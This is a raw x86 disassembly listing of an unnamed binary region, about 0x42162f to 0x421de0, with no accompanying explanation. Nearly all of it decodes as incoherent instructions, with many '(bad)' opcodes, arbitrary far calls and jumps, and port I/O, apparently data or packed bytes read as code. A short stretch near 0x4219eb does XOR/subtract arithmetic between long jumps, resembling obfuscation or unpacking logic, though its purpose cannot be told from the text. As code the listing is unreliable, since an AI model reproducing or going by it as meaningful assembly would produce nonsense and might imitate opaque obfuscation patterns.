  42162f:	cmp    al,0x4b
  421631:	daa    
  421632:	add    ecx,DWORD PTR [edi]
  421634:	ret    
  421635:	pop    ds
  421636:	sbb    esp,DWORD PTR [edi+0x1da29f52]
  42163c:	imul   DWORD PTR [ebp-0x4fe63f4e]
  421642:	iret   
  421643:	mov    cl,0xcd
  421645:	call   0xf7bc:0xa18cd7c8
  42164c:	pop    ss
  42164d:	push   ecx
  42164e:	nop
  42164f:	test   eax,0x82b4a607
  421654:	mov    dl,0xa9
  421656:	sub    dh,BYTE PTR [esi]
  421658:	int    0xcc
  42165a:	cld    
  42165b:	imul   ebp,DWORD PTR [esi],0x5
  42165e:	adc    cl,cl
  421660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421661:	and    BYTE PTR [eax+0x4b8b9d16],al
  421667:	push   0xbc3312bf
  42166c:	or     al,0x9f
  42166e:	mov    esp,0x8e743aaf
  421673:	mov    esi,0x6c31763b
  421678:	call   0xd7fc:0x88d3e30c
  42167f:	push   0x74
  421681:	(bad)  
  421682:	jae    0x4216fd
  421684:	xchg   BYTE PTR [ecx+0x2d],dh
  421687:	mov    esi,0x7f47a4fc
  42168c:	(bad)  
  42168d:	add    bl,BYTE PTR [edi+0x6cc33a2c]
  421693:	dec    eax
  421694:	hlt    
  421695:	push   esi
  421696:	cmp    eax,esp
  421698:	shl    ebx,cl
  42169a:	push   0x74
  42169c:	xchg   bh,dl
  42169e:	ret    
  42169f:	pop    edi
  4216a0:	inc    edi
  4216a1:	mov    ah,0x2e
  4216a3:	into   
  4216a4:	ret    
  4216a5:	mov    bh,0xef
  4216a7:	cmp    DWORD PTR [ecx],0x7b
  4216aa:	jne    0x421727
  4216ac:	jg     0x421667
  4216ae:	outs   dx,BYTE PTR ds:[esi]
  4216af:	or     DWORD PTR [ebx],esp
  4216b1:	(bad)  [esi+eiz*2-0x437a4840]
  4216b8:	fsub   DWORD PTR [ebx]
  4216ba:	pop    ecx
  4216bb:	cmp    al,0xef
  4216bd:	div    eax
  4216bf:	push   cs
  4216c0:	out    dx,al
  4216c1:	inc    edi
  4216c2:	rcr    DWORD PTR [ebp-0x343a540a],0x7d
  4216c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216ca:	int    0x49
  4216cc:	pop    ecx
  4216cd:	pop    ecx
  4216ce:	ss inc edi
  4216d0:	stos   DWORD PTR es:[edi],eax
  4216d1:	cmp    DWORD PTR [edi+ebx*2],edx
  4216d4:	jns    0x421685
  4216d6:	inc    edi
  4216d7:	dec    esi
  4216d8:	js     0x421759
  4216da:	hlt    
  4216db:	pusha  
  4216dc:	iret   
  4216dd:	and    ah,BYTE PTR [esi-0x11]
  4216e0:	mov    esp,ebx
  4216e2:	leave  
  4216e3:	sub    eax,0x3411731d
  4216e8:	pop    edi
  4216e9:	(bad)  
  4216ea:	mov    al,ds:0xe966ec16
  4216ef:	mov    ah,0xd8
  4216f1:	out    dx,eax
  4216f2:	addr16 push sp
  4216f5:	clc    
  4216f6:	fnstcw WORD PTR [esi+0x3e]
  4216f9:	mov    ebx,DWORD PTR [eax-0x4f85feb4]
  4216ff:	mov    eax,DWORD PTR [ebx-0x35]
  421702:	ret    0x65a0
  421705:	inc    ebp
  421706:	aad    0x39
  421708:	out    dx,eax
  421709:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42170a:	add    al,0xa0
  42170c:	fild   QWORD PTR [edx]
  42170e:	inc    ecx
  42170f:	push   edi
  421710:	je     0x421707
  421712:	cmp    BYTE PTR [edi+0x29e91611],bh
  421718:	mov    eax,ds:0x1a9a5be3
  42171d:	icebp  
  42171e:	xchg   esi,eax
  42171f:	lea    ebx,[ecx+0x40fcf498]
  421725:	jmp    0x1246:0xbfd030b0
  42172c:	and    bl,BYTE PTR [edi+0x3d856a07]
  421732:	push   ecx
  421733:	fimul  WORD PTR ds:0x192b606b
  421739:	sbb    ebp,ebx
  42173b:	cli    
  42173c:	test   esi,eax
  42173e:	push   esp
  42173f:	and    DWORD PTR [edx+0x29],esi
  421742:	cli    
  421743:	pop    es
  421744:	hlt    
  421745:	jnp    0x42175a
  421747:	(bad)  [eax+0x6e76af24]
  42174d:	cmp    ch,BYTE PTR [ebp+0x728256b0]
  421753:	pop    eax
  421754:	into   
  421755:	stos   BYTE PTR es:[edi],al
  421756:	inc    ebx
  421757:	dec    ecx
  421758:	test   eax,0x8e7aadad
  42175d:	dec    edi
  42175e:	cmp    ecx,DWORD PTR ds:0x64743554
  421764:	pop    ebx
  421765:	xchg   bl,cl
  421767:	mov    WORD PTR [edx+0x500ecbb5],?
  42176d:	clc    
  42176e:	neg    BYTE PTR [ebp+0x6fc13ce8]
  421774:	(bad)  
  421776:	shl    BYTE PTR [esi+0x3a56de4f],0xdb
  42177d:	sub    BYTE PTR [ebx+0x2a6446e0],ah
  421783:	pop    edi
  421784:	mov    ebx,0xea1b13c8
  421789:	outs   dx,DWORD PTR ds:[esi]
  42178a:	cmp    eax,0x96d8a660
  42178f:	sub    DWORD PTR [edi+0x54],esi
  421792:	dec    ebp
  421793:	rcl    BYTE PTR [esp],0x8c
  421797:	out    0x73,al
  421799:	popf   
  42179a:	lahf   
  42179b:	(bad)  
  42179c:	mov    ecx,edi
  42179e:	xchg   esi,eax
  42179f:	call   0x83d9bc59
  4217a4:	in     al,dx
  4217a5:	fadd   QWORD PTR [edx]
  4217a7:	loop   0x421764
  4217a9:	push   0x9896919
  4217ae:	call   0xfa3b:0xc212c663
  4217b5:	sub    BYTE PTR [edi+0x38],bl
  4217b8:	call   0xb3984633
  4217bd:	and    al,0x73
  4217bf:	fcom   DWORD PTR [eax+edi*4-0x13]
  4217c3:	(bad)  
  4217c4:	shl    ebp,0x98
  4217c7:	dec    ecx
  4217c8:	mov    edx,0xa1426424
  4217cd:	jge    0x4217b0
  4217cf:	jp     0x421807
  4217d1:	bound  esp,QWORD PTR [eax+0x24f4da9e]
  4217d7:	imul   esp,DWORD PTR [edi-0x4669d1ab],0x24abdce4
  4217e1:	shl    BYTE PTR [ebx],0xdf
  4217e4:	mov    al,0x76
  4217e6:	dec    ebx
  4217e7:	pop    edi
  4217e8:	sbb    dh,BYTE PTR [ecx-0x58]
  4217eb:	pop    ecx
  4217ec:	aam    0x26
  4217ee:	pop    edi
  4217ef:	xchg   edx,eax
  4217f0:	ficom  WORD PTR [ebx]
  4217f2:	and    BYTE PTR [edi],bl
  4217f4:	ins    BYTE PTR es:[edi],dx
  4217f5:	adc    BYTE PTR [eax-0x20],dl
  4217f8:	ins    BYTE PTR es:[edi],dx
  4217f9:	rcl    cl,cl
  4217fb:	rcr    BYTE PTR [ebp+esi*1+0x74],cl
  4217ff:	lea    edi,[ebp+0x4a]
  421802:	jb     0x42179f
  421804:	jge    0x42182f
  421806:	pop    ss
  421807:	outs   dx,BYTE PTR ds:[esi]
  421808:	cdq    
  421809:	xlat   BYTE PTR ds:[ebx]
  42180a:	scas   eax,DWORD PTR es:[edi]
  42180b:	cmp    ch,ah
  42180d:	pop    ecx
  42180e:	add    BYTE PTR [ebx-0x5b3b02c1],dl
  421814:	dec    ebp
  421815:	imul   edx,DWORD PTR [ecx+0x77],0x63
  421819:	ins    DWORD PTR es:[edi],dx
  42181a:	pop    ds
  42181b:	add    BYTE PTR [ecx+0x6e],bh
  42181e:	bswap  edx
  421820:	inc    ebx
  421821:	and    BYTE PTR [eax-0x1013688],al
  421827:	(bad)  [ecx]
  421829:	xor    al,0x55
  42182b:	xchg   esi,eax
  42182c:	push   esp
  42182d:	bswap  ebx
  42182f:	xchg   DWORD PTR ds:[ecx],esp
  421832:	lock push ss
  421834:	aas    
  421835:	fistp  QWORD PTR [esi]
  421837:	js     0x421852
  421839:	in     al,0xe9
  42183b:	dec    eax
  42183c:	inc    ecx
  42183d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42183e:	repz sub ah,BYTE PTR [ecx]
  421841:	mov    cl,0x7
  421843:	ror    BYTE PTR [edi],0x5d
  421846:	call   0x8f9217a1
  42184b:	sub    BYTE PTR [eax-0x1],al
  42184e:	inc    esi
  42184f:	add    bh,dh
  421851:	daa    
  421852:	xor    BYTE PTR [ecx-0x1c],ah
  421855:	pop    es
  421856:	add    eax,0x1141c534
  42185b:	mov    ah,0x3d
  42185d:	jo     0x421852
  42185f:	mov    eax,ds:0xa8f77f37
  421864:	sbb    eax,0x43fa50af
  421869:	into   
  42186a:	(bad)  
  42186c:	xchg   esi,eax
  42186d:	inc    ebp
  42186e:	cmp    ebp,0x73
  421871:	or     cl,ah
  421873:	adc    bh,BYTE PTR [eax+0x40]
  421876:	pop    ss
  421877:	je     0x4218ae
  421879:	int3   
  42187a:	dec    esi
  42187b:	mov    ecx,ebp
  42187d:	lods   eax,DWORD PTR ds:[esi]
  42187e:	fsubr  DWORD PTR [edi]
  421880:	mov    esp,0xe105b2b9
  421885:	std    
  421886:	push   edi
  421887:	test   al,0xe2
  421889:	mov    DWORD PTR [ecx+0x71],ebp
  42188c:	xchg   edi,eax
  42188d:	outs   dx,BYTE PTR ds:[esi]
  42188e:	stos   DWORD PTR es:[edi],eax
  42188f:	mov    ebx,0x73ca1358
  421894:	in     eax,0x1e
  421896:	sub    BYTE PTR [eax+0x24],dh
  421899:	xchg   edx,eax
  42189a:	lods   al,BYTE PTR ds:[esi]
  42189b:	xlat   BYTE PTR ds:[ebx]
  42189c:	test   DWORD PTR [edi+edi*8],0x9e6205f2
  4218a3:	mov    ds:0x44acda54,al
  4218a8:	cmp    esp,ebp
  4218aa:	sbb    DWORD PTR [esi],edi
  4218ac:	sub    al,0xc5
  4218ae:	cmp    BYTE PTR [eax+ebx*4],dh
  4218b1:	pop    edi
  4218b2:	jg     0x4218df
  4218b4:	xor    eax,esp
  4218b6:	or     DWORD PTR [esi],0xfffffff6
  4218b9:	jmp    0xd6ee:0xf517b56d
  4218c0:	pop    es
  4218c1:	cmc    
  4218c2:	cwde   
  4218c3:	mov    ah,0x34
  4218c5:	fsub   st(6),st
  4218c7:	push   es
  4218c8:	mov    edx,0x78151481
  4218cd:	aaa    
  4218ce:	xchg   esi,eax
  4218cf:	mov    ah,0xb5
  4218d1:	js     0x421888
  4218d3:	pusha  
  4218d4:	inc    ebx
  4218d5:	and    cl,BYTE PTR [ecx-0x5]
  4218d8:	dec    ebp
  4218d9:	adc    DWORD PTR [esi],edx
  4218db:	(bad)  
  4218dc:	and    BYTE PTR [ecx-0x38],ch
  4218df:	or     edx,DWORD PTR [esi-0x57]
  4218e2:	stos   BYTE PTR es:[edi],al
  4218e3:	push   ds
  4218e4:	push   ds
  4218e5:	test   eax,0xbb37a70e
  4218ea:	fst    QWORD PTR [edx+0x4c378070]
  4218f0:	pop    edi
  4218f1:	fwait
  4218f2:	pop    edi
  4218f3:	pop    DWORD PTR [ebp+ebx*2-0x44]
  4218f7:	mov    esp,ss
  4218f9:	sub    al,0x31
  4218fb:	test   BYTE PTR [ecx+0x6b002ca7],dh
  421901:	push   ss
  421902:	ret    
  421903:	and    BYTE PTR [esi],dl
  421905:	or     DWORD PTR [ecx+0x1],eax
  421908:	mov    esi,0x15ff3ad1
  42190d:	pushf  
  42190e:	hlt    
  42190f:	sub    eax,esp
  421911:	xchg   ecx,eax
  421912:	xor    edi,DWORD PTR [ecx+0x30]
  421915:	sub    al,0xf3
  421917:	inc    eax
  421918:	or     DWORD PTR [ebp+esi*8+0x66],esi
  42191c:	call   0x426:0xe2107ce
  421923:	pop    esp
  421924:	iret   
  421925:	repnz lods al,BYTE PTR ds:[esi]
  421927:	pop    edi
  421928:	mov    ebp,0x59bf6c48
  42192d:	ins    BYTE PTR es:[edi],dx
  42192e:	or     BYTE PTR ds:0x69b038,bl
  421934:	cld    
  421935:	mov    ebx,0xa8710b7b
  42193a:	add    bl,BYTE PTR [ebp+0x17]
  42193d:	loope  0x4218cf
  42193f:	out    dx,eax
  421940:	sbb    al,0x9a
  421942:	je     0x421958
  421944:	xchg   DWORD PTR [ecx+esi*8],ebx
  421947:	mov    edx,0x57e8668c
  42194c:	inc    edx
  42194d:	jmp    0x313:0x6856cdbf
  421954:	jb     0x42199d
  421956:	popa   
  421957:	dec    edi
  421958:	test   BYTE PTR [eax],al
  42195a:	repz adc eax,0x4ace85ac
  421960:	or     BYTE PTR [ecx],cl
  421962:	cmp    al,0x79
  421964:	data16 sbb ch,BYTE PTR ds:0x2d7454ee
  42196b:	mov    ds:0x3c686a9,eax
  421970:	cwde   
  421971:	sar    DWORD PTR [eax],1
  421973:	retf   0xe2f5
  421976:	ins    BYTE PTR es:[edi],dx
  421977:	jle    0x421969
  421979:	aad    0x97
  42197b:	adc    ch,BYTE PTR [ebp-0x3e]
  42197e:	sar    ebx,1
  421980:	sub    BYTE PTR [edi-0x26],cl
  421983:	add    al,cl
  421985:	jne    0x421925
  421987:	or     DWORD PTR [ecx+edi*8-0x538cfbc],eax
  42198e:	xchg   esp,esp
  421990:	jne    0x421980
  421992:	sbb    dh,dl
  421994:	sbb    ch,cl
  421996:	mov    al,ch
  421998:	push   cs
  421999:	pop    ds
  42199a:	add    cl,BYTE PTR [ecx*8+0x526aee13]
  4219a1:	scas   al,BYTE PTR es:[edi]
  4219a2:	or     BYTE PTR [ebx-0x5fca1aa6],cl
  4219a8:	retf   0x8f7d
  4219ab:	xor    BYTE PTR [eax+0x75],0xc8
  4219af:	es push ss
  4219b1:	pop    es
  4219b2:	add    eax,0xfff1b186
  4219b7:	sti    
  4219b8:	push   esp
  4219b9:	pop    ebp
  4219ba:	rcl    ah,cl
  4219bc:	or     al,0xd9
  4219be:	mov    bh,0xcb
  4219c0:	scas   al,BYTE PTR es:[edi]
  4219c1:	adc    eax,ebp
  4219c3:	mov    WORD PTR [edi+esi*2+0x1edf9e01],?
  4219ca:	mov    bl,0xe6
  4219cc:	sub    ah,BYTE PTR [ebx]
  4219ce:	js     0x421a4f
  4219d0:	mov    DWORD PTR [edx-0x1f],0x8b90cd18
  4219d7:	mov    esp,eax
  4219d9:	mov    bh,BYTE PTR [ecx-0x53ea0523]
  4219df:	and    ah,BYTE PTR [ecx+0x3f4e5a71]
  4219e5:	jne    0x414081
  4219eb:	jmp    0x423e83
  4219f0:	mov    edx,DWORD PTR [ebp-0x10]
  4219f3:	mov    DWORD PTR [ebp+0x8],edx
  4219f6:	jmp    0x423df4
  4219fb:	mov    edx,DWORD PTR [ebp+0x8]
  4219fe:	mov    ebx,DWORD PTR [ebp-0x8]
  421a01:	xor    edx,eax
  421a03:	xor    ebx,eax
  421a05:	sub    edx,ebx
  421a07:	sub    edx,esi
  421a09:	xor    edx,eax
  421a0b:	mov    DWORD PTR [ebp+0x8],edx
  421a0e:	mov    edx,DWORD PTR [ebp+0x8]
  421a11:	mov    ebx,DWORD PTR [ebp-0x58]
  421a14:	add    edx,0x5708f8
  421a1a:	jmp    0x423da3
  421a1f:	sub    BYTE PTR [edx],ch
  421a21:	addr16 jnp 0x421a8b
  421a24:	jnp    0x4219b2
  421a26:	jne    0x421a11
  421a28:	jne    0x421a13
  421a2a:	neg    DWORD PTR [edx+0x2d0ea165]
  421a30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a31:	jns    0x421aad
  421a33:	push   es
  421a34:	pop    edi
  421a35:	jp     0x421ab1
  421a37:	mov    bh,0xd8
  421a39:	push   edx
  421a3a:	xchg   esp,eax
  421a3b:	shr    BYTE PTR [ebp+0x66cf1ff5],cl
  421a41:	xchg   BYTE PTR [ebp-0x2f],cl
  421a44:	fldenv [ebp+0x59567daf]
  421a4a:	jmp    0x4219d8
  421a4c:	and    al,al
  421a4e:	outs   dx,BYTE PTR ds:[esi]
  421a4f:	jnp    0x421a38
  421a51:	(bad)  
  421a52:	xchg   ecx,eax
  421a53:	cdq    
  421a54:	and    al,0x90
  421a56:	scas   eax,DWORD PTR es:[edi]
  421a57:	or     eax,0xd3db3953
  421a5c:	and    DWORD PTR [edx-0x757c03b6],ecx
  421a62:	sahf   
  421a63:	inc    edi
  421a64:	sbb    DWORD PTR [edx+0x18ed2062],ebx
  421a6a:	dec    eax
  421a6b:	sub    al,0x5d
  421a6d:	mov    dl,0x71
  421a6f:	mov    ds:0xf830ab1c,eax
  421a74:	cmp    DWORD PTR [ebx-0x1f425318],esp
  421a7a:	in     eax,dx
  421a7b:	pop    es
  421a7c:	sbb    eax,0x892ef56f
  421a81:	inc    esi
  421a82:	test   al,0xee
  421a84:	mov    ds:0xd0e0f5f7,eax
  421a89:	cmp    ebx,DWORD PTR [esi+0x14]
  421a8c:	xchg   edx,eax
  421a8d:	push   0xffffff8b
  421a8f:	xor    al,0xeb
  421a91:	loopne 0x421b08
  421a93:	push   ds
  421a94:	cmc    
  421a95:	inc    ebp
  421a96:	and    esi,DWORD PTR [esi]
  421a98:	jns    0x421ac3
  421a9a:	mov    ds:0x7c6a9cd7,al
  421a9f:	jo     0x421a54
  421aa1:	cmp    esp,ebx
  421aa3:	mov    esp,0x720da439
  421aa8:	lods   al,BYTE PTR ds:[esi]
  421aa9:	jp     0x421a91
  421aab:	into   
  421aac:	xchg   ebp,eax
  421aad:	inc    esp
  421aae:	imul   ebp,DWORD PTR [eax-0x80],0x145d1211
  421ab5:	dec    eax
  421ab6:	dec    edx
  421ab7:	push   eax
  421ab8:	pop    esp
  421ab9:	sahf   
  421aba:	and    BYTE PTR [edx-0x43],cl
  421abd:	add    BYTE PTR [eax+ebp*2-0x6997f792],ah
  421ac4:	cli    
  421ac5:	sbb    al,0xab
  421ac7:	mov    DWORD PTR [edi],esp
  421ac9:	mov    al,0xeb
  421acb:	shr    BYTE PTR [eax-0x2ab20472],0xb1
  421ad2:	dec    ebp
  421ad3:	pop    ecx
  421ad4:	lea    ecx,[edi]
  421ad6:	es sub cl,ch
  421ad9:	inc    ecx
  421ada:	adc    eax,0xb5d772d
  421adf:	(bad)  
  421ae0:	add    bl,BYTE PTR [eax-0x39d01f2e]
  421ae6:	popf   
  421ae7:	in     eax,dx
  421ae8:	xchg   ebx,esi
  421aea:	aad    0x96
  421aec:	mov    eax,ds:0x3005288a
  421af1:	push   0x52
  421af3:	lea    esi,[edi]
  421af5:	xor    ah,BYTE PTR [edi+0x5f]
  421af8:	jmp    0x46a6:0xfdaaa7d8
  421aff:	in     eax,dx
  421b00:	shl    DWORD PTR [eax-0x4a],cl
  421b03:	and    eax,0x8128a14e
  421b08:	in     eax,dx
  421b09:	outs   dx,BYTE PTR ds:[esi]
  421b0a:	hlt    
  421b0b:	jne    0x421b09
  421b0d:	xchg   BYTE PTR [ebx+0x1042370d],al
  421b13:	or     edx,DWORD PTR [ebx]
  421b15:	stos   DWORD PTR es:[edi],eax
  421b16:	or     ebp,edx
  421b18:	std    
  421b19:	sub    al,BYTE PTR [esi]
  421b1b:	je     0x421ae4
  421b1d:	push   edi
  421b1e:	shr    BYTE PTR [ebx+0x29509f92],0xd4
  421b25:	sbb    dx,WORD PTR [edx]
  421b28:	leave  
  421b29:	pop    esp
  421b2a:	xchg   esi,eax
  421b2b:	leave  
  421b2c:	lods   al,BYTE PTR fs:[esi]
  421b2e:	inc    esp
  421b2f:	ret    
  421b30:	xchg   ebp,eax
  421b31:	out    dx,eax
  421b32:	fdiv   QWORD PTR [edi+0x4e845506]
  421b38:	stc    
  421b39:	rcr    DWORD PTR [eax+eiz*8-0x47],cl
  421b3d:	jle    0x421b91
  421b3f:	aad    0xe8
  421b41:	outs   dx,BYTE PTR ds:[esi]
  421b42:	cmp    ebp,DWORD PTR [eax-0x6a]
  421b45:	jns    0x421bb9
  421b47:	adc    esi,edi
  421b49:	add    al,BYTE PTR [ecx-0x6b]
  421b4c:	in     al,0xc1
  421b4e:	(bad)  
  421b50:	dec    esp
  421b51:	fistp  DWORD PTR [ecx+0x4c936512]
  421b57:	inc    ecx
  421b58:	add    al,0xcf
  421b5a:	cdq    
  421b5b:	push   edi
  421b5c:	out    dx,al
  421b5d:	(bad)  
  421b5e:	cli    
  421b5f:	jle    0x421bb8
  421b61:	bound  ebp,QWORD PTR [edx-0xa0b8e08]
  421b67:	sub    BYTE PTR [ebx+0x3c683193],0xf2
  421b6e:	stos   BYTE PTR es:[edi],al
  421b6f:	add    eax,0x41ce2973
  421b74:	inc    ebp
  421b75:	sbb    al,0x28
  421b77:	sbb    al,0xfb
  421b79:	xchg   esi,eax
  421b7a:	cmp    BYTE PTR [edx-0x67],al
  421b7d:	or     bh,0xc8
  421b80:	repnz in eax,0xef
  421b83:	dec    ebx
  421b84:	int3   
  421b85:	rcl    DWORD PTR [ebx+0x32],0x61
  421b89:	mov    ebx,0x3d785b5e
  421b8e:	add    DWORD PTR [eax-0x4e],esp
  421b91:	rol    ah,cl
  421b93:	sbb    BYTE PTR [ebp+0x53],ch
  421b96:	xor    DWORD PTR [ebx],eax
  421b98:	inc    eax
  421b99:	push   0xc4cb1700
  421b9e:	ret    0x3984
  421ba1:	jge    0x421b23
  421ba3:	cmc    
  421ba4:	ror    BYTE PTR [edi],cl
  421ba6:	sbb    al,0xea
  421ba9:	inc    ecx
  421baa:	aad    0x67
  421bac:	mov    WORD PTR [ebp+0x4d2d866e],?
  421bb2:	mov    DWORD PTR [edx-0x30102b6e],ecx
  421bb8:	pop    ebx
  421bb9:	or     eax,0x4cdb268e
  421bbe:	ret    0x2451
  421bc1:	imul   edx,DWORD PTR [ecx+ecx*2+0x10f2d806],0x28
  421bc9:	cld    
  421bca:	ds loope 0x421b54
  421bcd:	dec    esi
  421bce:	dec    ebx
  421bcf:	inc    eax
  421bd0:	xchg   ebx,eax
  421bd1:	out    dx,al
  421bd2:	sahf   
  421bd3:	adc    esp,0x33
  421bd6:	push   ecx
  421bd8:	cmp    ebx,edi
  421bda:	scas   al,BYTE PTR es:[edi]
  421bdb:	das    
  421bdc:	sbb    eax,0xa4a9d5f2
  421be1:	sub    DWORD PTR [eax+0x1],edx
  421be4:	pushf  
  421be5:	push   edi
  421be6:	rcr    DWORD PTR [ebp-0xc1d8409],0x48
  421bed:	and    ebp,DWORD PTR [edi+edi*4+0x60]
  421bf1:	pop    ss
  421bf2:	sub    eax,0x45dbb530
  421bf7:	push   ebp
  421bf8:	xchg   edi,eax
  421bf9:	mov    dl,0x7f
  421bfb:	mov    cl,0xe6
  421bfd:	outs   dx,BYTE PTR ds:[esi]
  421bfe:	stos   BYTE PTR es:[edi],al
  421bff:	das    
  421c00:	lods   al,BYTE PTR ds:[esi]
  421c01:	sbb    DWORD PTR [eax+0x12f19ee2],eax
  421c07:	pop    edi
  421c08:	outs   dx,DWORD PTR ds:[esi]
  421c09:	or     eax,0xa45f941c
  421c0e:	sbb    eax,0x63c44396
  421c13:	push   es
  421c14:	mov    al,0x14
  421c16:	push   ecx
  421c17:	push   ebx
  421c18:	jae    0x421c3c
  421c1a:	sub    dl,BYTE PTR [ebx]
  421c1c:	xchg   esi,eax
  421c1d:	pop    ds
  421c1e:	fist   DWORD PTR [ebp+0xb]
  421c21:	push   ebx
  421c22:	adc    esi,DWORD PTR [edx+eiz*1]
  421c25:	mov    cl,0x1e
  421c27:	pop    ebx
  421c28:	or     BYTE PTR [ebx],bh
  421c2a:	sti    
  421c2b:	push   eax
  421c2c:	pop    ds
  421c2d:	jmp    edi
  421c2f:	cmp    eax,0x381f4fd2
  421c34:	and    BYTE PTR [edx],ah
  421c36:	repz dec ebx
  421c38:	out    dx,al
  421c39:	test   eax,0x4ea5afc5
  421c3e:	in     al,0xf8
  421c40:	outs   dx,DWORD PTR ds:[esi]
  421c41:	add    al,0xd8
  421c43:	loopne 0x421c7a
  421c45:	fadd   DWORD PTR [edi]
  421c47:	rcr    BYTE PTR [ecx-0x50],cl
  421c4a:	sbb    dl,bl
  421c4c:	icebp  
  421c4d:	mov    al,ds:0x1c573edd
  421c52:	(bad)  
  421c53:	js     0x421c00
  421c55:	(bad)  
  421c56:	gs cmp cl,0x57
  421c5a:	xor    DWORD PTR [ecx-0x5a],0xa
  421c5e:	fdivr  DWORD PTR [eax-0x24f79b00]
  421c64:	add    al,0x66
  421c66:	push   esi
  421c67:	pop    ss
  421c68:	xlat   BYTE PTR ds:[ebx]
  421c69:	ret    
  421c6a:	pop    es
  421c6b:	push   edi
  421c6c:	jnp    0x421c0e
  421c6e:	pop    ds
  421c6f:	neg    DWORD PTR [ecx]
  421c71:	mov    al,BYTE PTR [ebx]
  421c73:	pop    eax
  421c74:	repnz lock and bh,BYTE PTR [esi+edx*2+0x79]
  421c7a:	adc    ebx,DWORD PTR [esi-0x3f85eb2f]
  421c80:	fdivp  st(4),st
  421c82:	push   0x19cd45e
  421c87:	push   esp
  421c88:	jne    0x421cdb
  421c8a:	gs add eax,0xc80d24b5
  421c90:	out    dx,al
  421c91:	cmp    DWORD PTR [ecx],0x82ac92c3
  421c97:	xchg   ebx,eax
  421c98:	fidiv  DWORD PTR gs:[eax-0xd]
  421c9c:	push   0x8b32de24
  421ca1:	adc    bl,BYTE PTR [esi-0x19]
  421ca4:	xchg   ebp,eax
  421ca5:	sbb    eax,0x80b9586e
  421caa:	adc    BYTE PTR [esi+0x65],bl
  421cad:	or     al,0xba
  421caf:	pop    esp
  421cb0:	repz out 0xd7,eax
  421cb3:	cmp    esp,DWORD PTR [edx+0x63]
  421cb6:	aam    0xb3
  421cb8:	(bad)  
  421cb9:	sbb    eax,0x1cb63af6
  421cbe:	push   cs
  421cbf:	rcl    BYTE PTR [eax+ebx*2-0x1e2bed6c],cl
  421cc6:	leave  
  421cc7:	(bad)  
  421cc8:	scas   eax,DWORD PTR es:[edi]
  421cc9:	push   ebp
  421cca:	int3   
  421ccb:	or     DWORD PTR [edx+0x6cf2a22],0xb8a2b26
  421cd5:	rol    ecx,cl
  421cd7:	or     ch,bh
  421cd9:	dec    ebx
  421cda:	jle    0x421d37
  421cdc:	data16 ss shr ch,1
  421ce0:	(bad)  
  421ce1:	jecxz  0x421cb0
  421ce3:	and    bh,BYTE PTR [esi+0x24ed52aa]
  421ce9:	push   ecx
  421cea:	loopne 0x421d38
  421cec:	gs mov ch,0xef
  421cef:	(bad)  
  421cf0:	xor    al,0xee
  421cf2:	xchg   ebp,eax
  421cf3:	add    al,0x2c
  421cf5:	push   ds
  421cf6:	xchg   ebx,eax
  421cf7:	retf   0xf82c
  421cfa:	sar    BYTE PTR [edx],cl
  421cfc:	shr    DWORD PTR [edx],0x1b
  421cff:	jmp    0x9268:0x63eaae7b
  421d06:	jmp    0x421d1d
  421d08:	pop    eax
  421d09:	xor    BYTE PTR [edx],al
  421d0b:	mov    cl,0xac
  421d0d:	or     ebx,edx
  421d0f:	inc    ebp
  421d10:	cli    
  421d11:	sar    DWORD PTR [ecx-0x570818b9],1
  421d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d18:	les    edx,FWORD PTR [esi+0x5b]
  421d1b:	js     0x421d72
  421d1d:	jns    0x421d2d
  421d1f:	mov    eax,0xc82d3583
  421d24:	div    cl
  421d26:	inc    esp
  421d27:	inc    ecx
  421d28:	xchg   DWORD PTR [eax],ebp
  421d2a:	mov    ecx,0xf93727fb
  421d2f:	mov    dh,0x38
  421d31:	rol    DWORD PTR [ecx],cl
  421d33:	test   esp,0xf3827987
  421d39:	mov    bl,0x82
  421d3b:	inc    eax
  421d3c:	std    
  421d3d:	adc    eax,0xf5651f7d
  421d42:	enter  0xbe8f,0x84
  421d46:	xor    BYTE PTR [edx-0x64],0x2f
  421d4a:	int3   
  421d4b:	pop    esi
  421d4c:	mov    ds:0x107feca7,eax
  421d51:	hlt    
  421d52:	cmp    BYTE PTR [edx+0x5b],0x8b
  421d56:	lahf   
  421d57:	scas   al,BYTE PTR es:[edi]
  421d58:	mov    ebp,cs
  421d5a:	ja     0x421cf2
  421d5c:	pop    esp
  421d5d:	xor    bh,al
  421d5f:	mov    al,0x3b
  421d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d62:	or     eax,0x7108e9d1
  421d67:	mov    bh,0xe6
  421d69:	push   edi
  421d6a:	cmp    BYTE PTR [edi],bh
  421d6c:	xchg   ebx,eax
  421d6d:	cli    
  421d6e:	jge    0x421d16
  421d70:	sbb    DWORD PTR [ecx+0x2ca1e289],esi
  421d76:	iret   
  421d77:	adc    al,0x6f
  421d79:	cmp    eax,0x7f2bfafa
  421d7e:	xchg   esp,eax
  421d7f:	mov    esp,0x10b86c37
  421d84:	sub    al,0x92
  421d86:	and    cl,BYTE PTR [ecx+eax*4-0x481a7ffa]
  421d8d:	add    ah,BYTE PTR [edi+0x6a36d15]
  421d93:	xchg   BYTE PTR [esp+ebp*1+0x54],cl
  421d97:	jnp    0x421d2d
  421d99:	fimul  DWORD PTR [ebx+0x28c142a6]
  421d9f:	xchg   esi,eax
  421da0:	aaa    
  421da1:	fcmovnbe st,st(7)
  421da3:	dec    esp
  421da4:	cs je  0x421d52
  421da7:	dec    esp
  421da8:	fcomp  DWORD PTR [esi+ebp*1]
  421dab:	dec    edx
  421dac:	cmp    al,0xc4
  421dae:	jb     0x421de1
  421db0:	mov    esi,0xce7ead27
  421db5:	int3   
  421db6:	mov    bl,0x1c
  421db8:	push   esp
  421db9:	mov    DWORD PTR [edi-0x63dc3dcd],ecx
  421dbf:	push   ebx
  421dc0:	sub    eax,ecx
  421dc2:	pop    ds
  421dc3:	jbe    0x421ddb
  421dc5:	or     bl,BYTE PTR [esi+0x2c]
  421dc8:	add    BYTE PTR [ebx-0x1d2bd5c],dl
  421dce:	or     al,0x43
  421dd0:	jecxz  0x421d5b
  421dd2:	test   al,0x34
  421dd4:	cmp    esp,0xe701948b
  421dda:	aaa    
  421ddb:	fsub   QWORD PTR [edi]
  421ddd:	and    cl,al
  421ddf:	stc    
  421de0:	dec    ecx
